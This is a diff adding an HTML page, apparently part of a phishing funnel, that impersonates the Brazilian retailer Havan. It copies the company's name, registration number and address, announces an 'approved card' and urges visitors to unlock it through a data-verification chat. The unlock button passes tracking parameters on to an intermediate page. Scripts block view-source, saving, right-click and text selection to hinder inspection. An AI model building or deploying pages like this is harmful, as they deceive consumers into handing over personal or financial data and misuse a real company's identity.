@@ -1,0 +1,223 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+
+    
+    
+
+
+    
+    
+
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+    <meta charset="UTF-8">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="dns-prefetch" href="//portalcliente.havan.com.br">
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+    <title>Cartão Aprovado - Havan</title>
+    <style>
+        body {
+            background-color: #f9f9f9;
+            font-family: Arial, sans-serif;
+        }
+
+        .header {
+            background: rgb(255, 255, 255);
+            color: white;
+            padding: 15px 0;
+            text-align: center;
+        }
+
+        .header img {
+            width: 120px;
+        }
+
+        .main-content {
+            max-width: 600px;
+            margin: 40px auto;
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .main-title {
+            font-size: 28px;
+            font-weight: bold;
+            color: #002279;
+            margin-bottom: 20px;
+        }
+
+        .congratulations {
+            font-size: 18px;
+            color: #333;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .btn-unlock {
+            background-color: #002279;
+            color: white;
+            font-weight: bold;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 8px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        .btn-unlock:hover {
+            background-color: #001a5c;
+            color: white;
+            text-decoration: none;
+        }
+
+        .card-icon {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+
+        .footer {
+            background: #ffffff;
+            border-top: 1px solid #e6e6e6;
+            text-align: center;
+            padding: 15px;
+            font-size: 10px;
+            color: #666;
+        }
+
+        .styles_company__HQYS3 {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            text-align: center;
+            gap: 24px;
+            padding: 24px 16px 32px;
+        }
+
+        .styles_company__HQYS3 p {
+            font-size: .75rem;
+            line-height: 16px;
+            letter-spacing: 0;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("keydown", bloquearSource);
+        } else {
+            document.attachEvent("onkeydown", bloquearSource);
+        }
+
+        function bloquearSource(e) {
+            e = e || window.event;
+            var code = e.which || e.keyCode;
+            if (e.ctrlKey && (code == 83 || code == 85)) {
+                if (e.preventDefault) {
+                    e.preventDefault();
+                } else {
+                    e.returnValue = false;
+                }
+                return false;
+            }
+        }
+    </script>
+    <style>
+        body {
+            -webkit-touch-callout: none;
+            -webkit-user-select: none;
+            -khtml-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+        }
+
+        input, textarea {
+            -webkit-touch-callout: initial;
+            -webkit-user-select: text;
+            -khtml-user-select: text;
+            -moz-user-select: text;
+            -ms-user-select: text;
+            user-select: text;
+        }
+
+        [contenteditable=true] {
+            -webkit-touch-callout: initial;
+            -webkit-user-select: all;
+            -khtml-user-select: all;
+            -moz-user-select: all;
+            -ms-user-select: all;
+            user-select: all;
+        }
+    </style>
+    <script>
+        if (document.addEventListener) {
+            document.addEventListener("contextmenu", function (e) {
+                e.preventDefault();
+                return false;
+            });
+        } else {
+            document.attachEvent("oncontextmenu", function (e) {
+                e = e || window.event;
+                e.returnValue = false;
+                return false;
+            });
+        }
+    </script>
+
+    
+    
+
+    
+    
+    <script defer src="/funil/fast.js"></script>
+</head>
+
+<body>
+    <div class="header">
+        <img src="images/havan.png" alt="Logo">
+    </div>
+
+    <div class="main-content">
+        <div class="card-icon">💳</div>
+        <h1 class="main-title">Seu cartão está aprovado!</h1>
+        
+        <p class="congratulations">
+            Parabéns! Seu cadastro está completo e seu cartão já está em produção.
+        </p>
+        
+        <p class="subtitle">
+            Seu cartão já está pronto para uso online e você já pode acessá-lo! 
+            Porém, precisa fazer uma verificação de dados através do CHAT para desbloquear o cartão.
+        </p>
+        
+        <a href="intermediaria.html" class="btn-unlock" id="btnUnlock">DESBLOQUEAR CARTÃO</a>
+    </div>
+
+    <!-- Footer -->
+    <div class="styles_company__HQYS3">
+        <div>
+            <p class="styles_description__590uc">HAVAN S.A. | CNPJ: 79.379.491.0008-50 | Rod. Antônio Heil, 250 - Centro II, Brusque - SC, 88353-100</p>
+            <p class="styles_description__590uc">© 2025 - Todos os direitos reservados</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('btnUnlock').addEventListener('click', function(e) {
+            e.preventDefault();
+            const paramsString = window.location.search.replace(/^\?/, '');
+            const targetUrl = paramsString ? 'intermediaria.html?' + paramsString : 'intermediaria.html';
+            window.location.href = targetUrl;
+        });
+    </script>
+
+</body></html>
